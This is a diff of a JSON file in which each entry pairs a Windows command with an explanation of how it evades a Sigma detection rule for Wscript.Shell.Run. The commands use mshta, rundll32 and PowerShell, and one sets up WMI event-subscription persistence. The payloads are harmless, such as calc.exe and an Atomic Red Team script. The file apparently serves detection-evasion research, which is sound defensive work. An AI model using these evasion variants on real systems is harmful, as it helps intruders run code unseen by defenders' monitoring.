@@ -1,22 +1,24 @@
+```json
 [
   {
-    "output": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"calc.exe\"\"\")",
-    "explanation": "This command uses `mshta` to execute VBScript inline, calling `Wscript.Shell.Run` with encoded syntax and minimal elements to bypass the Sigma rule by omitting the full keyword sequence while still invoking the same behavior."
+    "output": "cmd.exe /c mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\"),Run \"\"powershell -noexit -file C:\\AtomicRedTeam\\atomics\\T1218.005\\src\\powershell.ps1\"\":close)",
+    "explanation": "This command attempts to bypass the Sigma rule by using equivalent syntax and encoding techniques while maintaining the same functionality. It uses 'mshta' with a VBScript to invoke 'Wscript.Shell.Run' in a slightly altered format."
   },
   {
     "output": "cmd.exe /c rundll32 vbscript:\"\\..\\mshtml,#135 \" + String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)",
-    "explanation": "This command uses `rundll32` with encoded VBScript to invoke `WScript.Shell.Run` without explicitly containing all the keywords in the original Sigma rule, leveraging path normalization and string concatenation."
+    "explanation": "This command uses path normalization and string concatenation to obfuscate the invocation of 'Wscript.Shell.Run'. It maintains the same behavior but alters the syntax to avoid direct keyword matching."
   },
   {
-    "output": "powershell.exe -Command \"[Activator]::CreateInstance([Type]::GetTypeFromProgID('WScript.Shell')).Run('calc.exe')\"",
-    "explanation": "This PowerShell command uses reflection to instantiate `WScript.Shell` and call its `Run` method, avoiding direct string matches for the Sigma rule while maintaining the same functionality."
+    "output": "powershell.exe -Command \"& { $FilterArgs = @{name='Test'; EventNameSpace='root\\CimV2'; QueryLanguage=\"WQL\"; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"}; $Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs; $ConsumerArgs = @{name='Test'; ScriptingEngine='VBScript'; ScriptText=' Set objws = CreateObject(\"Wscript.Shell\"); objws.Run \"notepad.exe\", 0, True '}; $Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs; $FilterToConsumerArgs = @{ Filter = $Filter; Consumer = $Consumer; }; $FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs }\"",
+    "explanation": "This command uses PowerShell to create a WMI event filter and consumer with VBScript that invokes 'Wscript.Shell.Run'. It is structured to avoid direct keyword detection by using a more complex syntax."
   },
   {
-    "output": "cmd.exe /c \"set a=Wscript. && set b=Shell && set c=Run && call %a%%b%.%c% calc.exe\"",
-    "explanation": "This command uses environment variables to split and reassemble the `Wscript.Shell.Run` string, avoiding direct keyword matches while still executing the same behavior."
+    "output": "mshta.exe about:<hta:application><script language=VBScript>Execute(\"CreateObject(\"\"Wscript.Shell\"\"),Run \"\"powershell.exe -nop -Command Write-Host Hello, MSHTA!;Start-Sleep -Seconds 5\"\"</script>",
+    "explanation": "This command uses MSHTA with VBScript to execute 'Wscript.Shell.Run' in a slightly obfuscated format. It avoids direct keyword detection by embedding the command within an HTML application."
   },
   {
-    "output": "mshta.exe about:<hta:application><script language=\"VBScript\">Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"calc.exe\"\"\")</script>",
-    "explanation": "This command uses `mshta` with an embedded VBScript tag to execute `Wscript.Shell.Run` without explicitly containing all the keywords in the Sigma rule, leveraging HTML and script tags for obfuscation."
+    "output": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \" + String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)",
+    "explanation": "This command uses 'rundll32' with VBScript to invoke 'Wscript.Shell.Run' in a different format. It leverages path normalization and string concatenation to avoid direct keyword matching."
   }
 ]
+```
